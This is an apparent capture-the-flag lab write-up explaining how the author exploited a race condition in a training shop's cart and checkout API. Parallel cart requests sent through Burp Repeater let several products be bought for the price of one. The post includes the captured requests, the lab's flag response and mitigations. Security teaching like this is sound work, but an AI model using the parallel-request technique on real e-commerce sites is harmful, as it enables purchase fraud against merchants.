---
title: "Race Condition in Cart and Checkout Flow – Multi-Item Purchase for Single Charge | Cafe Club"
date: 2026-05-10 22:24:01 +0530
categories: [Web Security, Insecure Design]
tags: [race-condition, business-logic, checkout-bypass, cart-manipulation, parallel-requests, burp-suite, bugforge]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/cafe-club-race-condition.webp
  alt: Race Condition in Cafe Club Checkout Flow
---

# Overview

Cafe Club is a coffee-related e-commerce application vulnerable to a race condition in its cart and checkout workflow. By abusing concurrent cart update requests, it was possible to purchase multiple products while only being charged for a single item.

The flaw existed because the backend failed to properly synchronize cart state and total price calculations during parallel request processing.

# Objective

Test the integrity of the cart and checkout workflow to identify potential business logic flaws involving concurrent requests.

# Reconnaissance

After purchasing an item normally, the checkout request was captured using Burp Suite.

The application used the following endpoint to finalize purchases:

```http
POST /api/checkout HTTP/2
Host: lab-1778451581224-x804l5.labs-app.bugforge.io
Content-Type: application/json
Authorization: Bearer <JWT>

{
  "points_to_use":0,
  "use_gift_card":false,
  "card_number":"4444 4444 4444 4444",
  "card_expiry":"12/25",
  "card_cvc":"123"
}
```

The cart functionality relied on the following API endpoint:

```http
POST /api/cart HTTP/2
Host: lab-1778451581224-x804l5.labs-app.bugforge.io
Content-Type: application/json
Authorization: Bearer <JWT>

{
  "product_id":4,
  "quantity":1
}
```

Further testing revealed that the cart API accepted concurrent requests without proper synchronization.

# Exploitation

Multiple cart requests were sent to Burp Repeater.

Different products were prepared as separate requests:

```http
{"product_id":4,"quantity":1}
{"product_id":7,"quantity":1}
{"product_id":14,"quantity":1}
{"product_id":5,"quantity":1}
{"product_id":10,"quantity":1}
```

## Parallel Request Execution

The requests were grouped together inside Burp Suite Repeater.

Using:

- **Group requests**
- **Send group in parallel**

all requests were executed simultaneously.

Because the backend processed the requests concurrently, every item was successfully inserted into the cart before the checkout state fully synchronized.

Immediately afterward, the `/api/checkout` request was sent.

The application finalized the order successfully, but only deducted the price of a single product while all additional products remained included in the order.

# Proof of Exploitation

The server responded with a successful order placement:

```http
HTTP/2 200 OK
Content-Type: application/json

{
  "message":"Order placed successfully",
  "order_id":5,
  "total":21.99,
  "gift_card_used":0,
  "points_used":0,
  "points_earned":21,
  "new_points_balance":42,
  "promotional_code":"bug{XcI8RjrKTHP1xDOyMFaigpILIffTvoEn}"
}
```

Despite multiple products being added to the cart, the application only charged `21.99`, demonstrating that the pricing logic could be bypassed through concurrent request abuse.

# Technical Analysis

This vulnerability is a classic **business logic race condition** affecting cart state consistency.

The issue occurred because:

- Cart modifications were processed concurrently
- Checkout calculations relied on unsynchronized cart data
- No transactional locking existed between cart updates and checkout processing
- The backend trusted inconsistent cart state during total calculation

The race window allowed:

1. Multiple products to be added simultaneously
2. Checkout to process before totals fully updated
3. The final order to contain all products while charging only once

# Impact

An attacker could abuse this vulnerability to:

- Purchase multiple products for the price of one
- Manipulate order totals
- Cause financial losses
- Abuse promotional and loyalty systems
- Generate inconsistent inventory records

In real-world environments, similar flaws can become highly impactful during:

- Flash sales
- Coupon campaigns
- Limited inventory purchases
- Automated bulk checkout abuse

# Mitigation

The application should implement strict synchronization and transactional integrity during cart and checkout operations.

## Recommended Fixes

- Use database transactions for cart and payment operations
- Lock cart state during checkout
- Recalculate totals immediately before payment finalization
- Prevent concurrent cart mutations during active checkout
- Implement idempotency protections
- Perform race-condition testing during QA and security assessments

# Real-World Insight

Race conditions are often overlooked because applications may appear logically correct during normal user interaction. However, modern asynchronous APIs and concurrent request handling frequently introduce state consistency issues.

E-commerce platforms are especially vulnerable when cart calculations, inventory updates, and payment logic are processed independently without proper transactional controls.

This lab demonstrates how business logic flaws can lead to severe financial impact even when authentication and authorization mechanisms appear secure.
